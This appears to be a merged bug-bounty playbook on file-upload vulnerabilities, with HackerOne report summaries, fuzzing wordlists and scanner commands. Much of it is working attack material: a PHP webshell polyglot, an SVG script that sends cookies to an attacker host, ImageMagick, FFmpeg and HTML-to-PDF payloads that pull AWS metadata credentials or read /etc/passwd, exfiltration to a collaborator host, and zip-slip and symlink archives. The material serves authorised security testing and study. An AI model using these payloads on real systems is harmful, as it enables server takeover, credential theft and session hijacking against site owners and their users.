- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.

### Tools and wordlists

### Tools

`Burp` · `ffuf` · `exiftool` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_file-upload.txt` | 65 |
| `~/.local/share/hackerone-reports/wordlists/params_file-upload.txt` | 25 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_file-upload.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_file-upload.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Test extension/MIME/polyglot bypasses manually; scan for known upload CVEs on the detected stack.

```sh
nuclei -u https://target -tags file-upload \
       -severity low,medium,high,critical -rl 40 -o nuclei_file-upload.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_file-upload_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class file-upload --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class file-upload
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class file-upload
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class file-upload --min-bounty 1000
```

### Related

- `hackerone-rce` (1,399 reports)
- `hackerone-path-traversal` (300 reports)
- `hackerone-xss` (2,569 reports)

### Related

- `rce` (1,399 reports)
- `path-traversal` (300 reports)
- `xss` (2,569 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/file-upload
2. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

### Additional notes

### Parameters observed

`mode` · `getsc` · `page` · `imgnum` · `fwa` · `AWSAccessKeyId` · `Expires` · `Signature` · `url` · `action` · `path` · `_hxcategory` · `cmd` · `fileToUpload` · `subject` · `report_id` · `file` · `can` · `start` · `num`

### Webshell via File Upload on ecjobs.starbucks.com.cn

`#506646` · Starbucks · $0 · critical · 2019-11-13 · ▲688
> Summary: OS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network. Description: I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.

### Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg

`#1027822` · Starbucks · $0 · critical · 2020-12-09 · ▲247
> ko2sec discovered an .ashx endpoint on mobile.starbucks.com.sg intended for image files permitted unrestricted file type uploads which could lead to a potential RCE. ko2sec's thorough analysis provided additional endpoints on other out of scope domains that shared this vulnerability. @ko2sec — thank you for reporting this vulnerability and for confirming the resolution.

### Unrestricted file upload in www.semrush.com > /my_reports/api/v1/upload/image

`#748903` · Semrush · $0 · medium · 2020-01-10 · ▲133
> @zcashi found vulnerability in My Reports Tool. Unrestricted file upload in My Reports Tool

### Unrestricted File Upload on https://partner.tiktokshop.com/wsos_v2/oec_partner/upload

`#1890284` · TikTok · $0 · medium · 2023-04-12 · ▲118
> An unrestricted file upload vulnerability was found on a partner.tiktokshop.com endpoint, where if the content-type in the header was changed, any extension could be uploaded. We thank @h4x0r dz for reporting this to our team.

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

### ImageMagick SSRF / File Read (ImageTragick family + modern variants)

```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### FFmpeg SSRF via HLS Playlist

```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

### HTML → PDF Converter Attacks

```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

### Archive Extraction Attacks (Zip Slip / Symlink)

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# File Upload — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `shell.php.jpg` `shell.pHp` `shell.php%00.jpg` `shell.svg`

- `.htaccess` -> `AddType application/x-httpd-php .jpg`

- SVG -> `<svg onload=alert(1)>`

- Zip -> `../../../../var/www/shell.php`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 3× | `cr_in_resume_from()` |

| 3× | `ctx->read_cb` |

| 3× | `cr_in_needs_rewind()` |

| 3× | `http_resume()` |

| 2× | `ctx->has_used_cb` |

| 2× | `ctx->has_used_cb = TRUE` |

| 2× | `curl_multi_remove_handle() returned 8 / API function called from within callback / No ASAN crash` |

| 1× | `https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}` |

| 1× | `PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}` |

| 1× | `val image = PicfitImage( / id = ImageId(s"$rel:${ThreadLocalRandom.nextString(8)}.$extension"), / // rel parameter used directly without val` |

| 1× | `curl -X POST "https://lichess.org/upload/image/user/test:evil:format:break" \ / -b "lila2=YOUR_SESSION_COOKIE" \ / -H "Origin: https://liche` |

| 1× | `/upload/image/user/{rel}` |

| 1× | `{rel}:{random12}:{random8}.{extension}` |

| 1× | `$ne` |

| 1× | `exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png` |

| 1× | `█████████@` |

| 1× | `<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">` |

| 1× | `.html()` |

| 1× | `SV_AddResource (t_eventscript, filename, FS_FileSize (filename), RES_FATALIFMISSING, 0);` |

| 1× | `alert(XSS)` |



## Parameters observed



`mode` · `getsc` · `page` · `imgnum` · `fwa` · `AWSAccessKeyId` · `Expires` · `Signature` · `url` · `action` · `path` · `_hxcategory` · `cmd` · `fileToUpload` · `subject` · `report_id` · `file` · `can` · `start` · `num`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_file-upload.txt` | 65 |

| `~/.local/share/hackerone-reports/wordlists/params_file-upload.txt` | 25 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_file-upload.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_file-upload.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Test extension/MIME/polyglot bypasses manually; scan for known upload CVEs on the detected stack.



```sh

nuclei -u https://target -tags file-upload \

       -severity low,medium,high,critical -rl 40 -o nuclei_file-upload.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_file-upload_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# File Upload — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Test extension/MIME/content-type bypasses and double extensions.

- Try SVG, HTML, polyglot images, and office macros for stored XSS/RCE.

- Check path traversal in filenames and zip-slip in archives.

- Test access control on uploaded files (private vs public, IDOR).

- Look for image processing and thumbnail generation sinks.



## Bypass tricks



- Content-type spoofing, magic-byte prefixing, and polyglots.

- Double extension, trailing dot/space, and case tricks.

- Race the upload validation or overwrite an existing file.



## Deeper checklist



- Test extension/MIME/content-type bypasses and double extensions.

- Try SVG, HTML, polyglot images, and office macros for stored XSS/RCE.

- Check path traversal in filenames and zip-slip in archives.

- Test access control on uploaded files (private vs public, IDOR).

- Look for image processing and thumbnail generation sinks.

- Verify execution/rendering, not just successful upload.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Webshell via File Upload on ecjobs.starbucks.com.cn** — `#506646` · Starbucks · $0 · ▲688

  > I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.

- **Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg** — `#1027822` · Starbucks · $0 · ▲247

  > ko2sec discovered an .ashx endpoint on mobile.starbucks.com.sg intended for image files permitted unrestricted file type uploads which could lead to a potential RCE.

- **Unrestricted File Upload on https://partner.tiktokshop.com/wsos_v2/oec_partner/upload** — `#1890284` · TikTok · $0 · ▲118

  > An unrestricted file upload vulnerability was found on a partner.tiktokshop.com endpoint, where if the content-type in the header was changed, any extension could be uploaded.

- **Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover** — `#3115705` · Dust · $0 · ▲118

  > This allows an attacker to issue authenticated API requests on behalf of the victim, including:

- **Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app** — `#351555` · Reverb.com · $0 · ▲96

  > Also this url https://api.cloudinary.com/v1 1/reverb/usage discloses statistics regarding stored files

- **Unrestricted file upload leads to Stored XSS** — `#880099` · GitLab · $0 · ▲90

  > `<?xml version="1.0" standalone="no"? <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" <svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"

- **Unauthenticated user can upload an attachment to the last updated report draft** — `#419896` · HackerOne · $0 · ▲87

  > This was possible by sending a specially crafted request to the `/attachments` endpoint.

- **Unrestricted File Upload at ██████████** — `#2357778` · Mars · $0 · ▲78

  > The endpoint "████████" enables unrestricted file uploads, meaning anyone on the internet, without registration, can upload any type of file.

- **ImageId Format Injection in Image Upload Endpoint** — `#3175928` · Lichess · $0 · ▲73

  > The `/upload/image/user/{rel}` endpoint doesn't validate the `rel` parameter properly.

- **Cross site scripting via file upload in subdomain ads.tiktok.com** — `#1433125` · TikTok · $500 · ▲65

  > Due to missing checks it was possible to upload .svg files which contained XSS payload.

- **Singapore - Unrestricted File Upload Leads to XSS on campaign.starbucks.com.sg/api/upload** — `#883151` · Starbucks · $0 · ▲61

  > ko2sec discovered it was possible to upload arbitrary content on https://campaign.starbucks.com.sg/api/upload, leading to a stored XSS.

- **Remote Code Execution (upload)** — `#116575` · Legal Robot · $0 · ▲60

  > Any file upload was accepted without filter, which led to RCE vulnerability.

- **XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com** — `#964550` · Shopify · $0 · ▲58

  > https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss comment exif metadata double quote.png

- **Unrestricted File Upload Results in Cross-Site Scripting Attacks** — `#1005355` · Uber · $0 · ▲58

  > It was found that an attacker can upload any type of file including HTML files when adding a menu during the onboarding process after signing up at https://www.ubereats.com/restaurant/en-CA/signup.

- **[Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia** — `#1547877` · Aiven Ltd · $5,000 · ▲56

  > cd to `jdbc-sqlite-jolokia-rce` and run `python3 poc.py` (if running locally, install kafka-python using pip first).

- **Stored XSS via SVG Upload in chat.line.biz** — `#3008878` · LY Corporation · $100 · ▲40

  > The web application allowed users to upload SVG files via chat.line.biz without properly filtering or disabling scripts embedded inside the SVG content.

- **Unrestricted File Upload Blind Stored Xss  in subdomain ads.tiktok.com** — `#1577370` · TikTok · $250 · ▲38

  > A blind stored Cross-Site Scripting (XSS) vulnerability was found on a TikTok Ads domain via uploaded file.

- **Unrestricted File Upload on reddit.secure.force.com** — `#1606957` · Reddit · $100 · ▲34

  > This vulnerability can become a [zero click exploit](https://innovatecybersecurity.com/security-threat-advisory/follina-zero-day-allows-zero-click-rce-from-office-docs/).

- **RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/** — `#2054184` · U.S. Dept Of Defense · $0 · ▲33

  > I found "repos" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.

- **Unrestricted File Upload on https://app.lemlist.com** — `#722919` · lemlist · $0 · ▲24

  > i found an Unrestricted File Upload on https://app.lemlist.com which let me upload anything.

- **SSRF & unrestricted file upload on https://my.stripo.email/** — `#771382` · Stripo Inc · $0 · ▲24

  > The researcher discovered an SSRF & unrestricted file upload (Remote code execution ) vulnerabilities .

- **File Upload XSS in image uploading of App in mopub** — `#97672` · X / xAI · $0 · ▲24

  > Referer: https://app.mopub.com/inventory/app/97142808ce5d4ace895480a3ffe7d631/

- **Unrestricted File Upload on https://auth.ratelimited.me** — `#463604` · RATELIMITED · $0 · ▲23

  > Have found a way to upload files that aren't images on https://auth.ratelimited.me/

- **Low privileges (auth) Remote Command Execution - PHP file upload bypass.** — `#841397` · ExpressionEngine · $0 · ▲22

  > ExpressionEngine was vulnerable to unrestricted file upload via a low-privileged user due to a bypass extension check that led to remote command execution.

- **Arbritrary file Upload on AirMax** — `#73480` · Ubiquiti Inc. · $0 · ▲21

  > An attacker can bypass the device's authentication mechanisms by exploiting this vulnerability.

- **Unrestricted Upload of File with Dangerous Type** — `#1081766` · Enjin · $0 · ▲20

  > The security researcher was able to execute [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html) through a legacy API endpoint used to upload images.

- **Unauthenticated arbitrary file upload on the https://█████/ (█████████)** — `#698789` · U.S. Dept Of Defense · $0 · ▲19

  > 3) Visit `https://███/delete.me` and you will see your uploaded file there

- **[chaturbate.com] - CSRF Vulnerability on image upload** — `#401483` · Chaturbate · $300 · ▲17

  > Edit `poc.html` by replacing the number `4771110` by the `set` ID found at step 3.

- **[█████] Bug Reports allow for Unrestricted File Upload** — `#1850065` · U.S. Dept Of Defense · $0 · ▲16

  > Intercept the `HTTP` request and change the extension of the attached file to one that is not allowed

- **[OPEN S3 BUCKET] All uploaded files are public.** — `#905641` · Courier · $0 · ▲16

  > https://s3.amazonaws.com/backend-production-librarybucket-1izigk5lryla9/85abcc94-a7db-4529-b0aa-826e3026c8c1/1592856757262 camion2.svg



## Case studies



### Webshell via File Upload on ecjobs.starbucks.com.cn

`#506646` · Starbucks · $0 · critical · 2019-11-13 · ▲688

> Summary: OS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network. Description: I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.



### Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg

`#1027822` · Starbucks · $0 · critical · 2020-12-09 · ▲247

> ko2sec discovered an .ashx endpoint on mobile.starbucks.com.sg intended for image files permitted unrestricted file type uploads which could lead to a potential RCE. ko2sec's thorough analysis provided additional endpoints on other out of scope domains that shared this vulnerability. @ko2sec — thank you for reporting this vulnerability and for confirming the resolution.



### Unrestricted file upload in www.semrush.com > /my_reports/api/v1/upload/image

`#748903` · Semrush · $0 · medium · 2020-01-10 · ▲133

> @zcashi found vulnerability in My Reports Tool. Unrestricted file upload in My Reports Tool



### Unrestricted File Upload on https://partner.tiktokshop.com/wsos_v2/oec_partner/upload

`#1890284` · TikTok · $0 · medium · 2023-04-12 · ▲118

> An unrestricted file upload vulnerability was found on a partner.tiktokshop.com endpoint, where if the content-type in the header was changed, any extension could be uploaded. We thank @h4x0r dz for reporting this to our team.



### Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover

`#3115705` · Dust · $0 · high · 2025-05-02 · ▲118

> A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality. An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class file-upload --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class file-upload

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class file-upload

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class file-upload --min-bounty 1000

```

## Corpus wordlists (mined)

### `params_file-upload.txt`

```text
mode
getsc
page
imgnum
fwa
AWSAccessKeyId
Expires
Signature
url
action
path
_hxcategory
cmd
fileToUpload
subject
report_id
file
can
start
num
groupby
sort
id
input
target
```

### `paths_file-upload.txt`

```text
/scripts/wa.cgi
/savefiles/poc.asp
/delete.me
/upload.php
/ui/core/index.html
/admin.php
/api/w/
/api/user
/w/
/files
/assistant/new
/v1_1/reverb/usage
/semsemhacker123/semsemtest/-/wikis/ssaa-home
/attachments
/hackers/retesting.html
/display
/upload/image/user/
/data/definitions/20.html
/upload/image/user/test:evil:format:break
/api/upload
/accounts/141376700
/accounts/
/restaurant/en-CA/signup
/recruitjob/hxpublic_v6/hxinterface6.aspx
/adhelp
/adhelp/
/adhelp/apexremote
/repo/orbital/repo.asp
/inventory/app_icon/upload/
/app_icons/126cb3308e1a464385a49c4c7aaeac56
/inventory/app/97142808ce5d4ace895480a3ffe7d631/
/data/definitions/434.html
/photo_videos/photoset/detail/[username
/request
/file-upload/
/v3/members/oldsoul/photo
/x-ctf-finals-2016-john-slick-web-25/
/v3/members/oldsoul/photoUploadUrl
/wp-admin/users.php
/admin/file/upload
/package/express-cart
/en/user/images/users/-13-04-2021-20-15-16-payload.php
/nexus/service/local/artifact/maven/content
/nexus/content/repositories/5000
/nexus/service/local/repositories
/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx
/vuln/detail/CVE-2025-64095
/template-order/
/CONTENT/content-pre1/171172-1.php5
/core/controller/avatarcontroller.php
/image1.php
/en/early-warning/vulnerabilities/cve-2006-7109
/tracker/CVE-2006-7109
/cp/members/profile/settings
/data/attacker/files/shell.php
/login.cgi
/production/000/006/741/bf60ba068e72e767b93d3fa35c89a36639dd1f19/msf-payload-x86.jpg.exe
/hc/en-us/requests/new
/registration-service/files/
/████/registration-service/files/███████.html
/app/registration/basic-info
/████████/app/registration/basic-info
/security/products/flash-player/apsb15-05.html
/path/to/curl/lib/.libs/libcurl.a
/wp-content/uploads/job-manager-uploads/company_logo/2015/11/Applet3863.class
```

## Source skills merged into this topic

- `h1skills` — `hackerone-file-upload`
- `hunting` — `file-upload`
- `cbh` — `hunt-file-upload`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
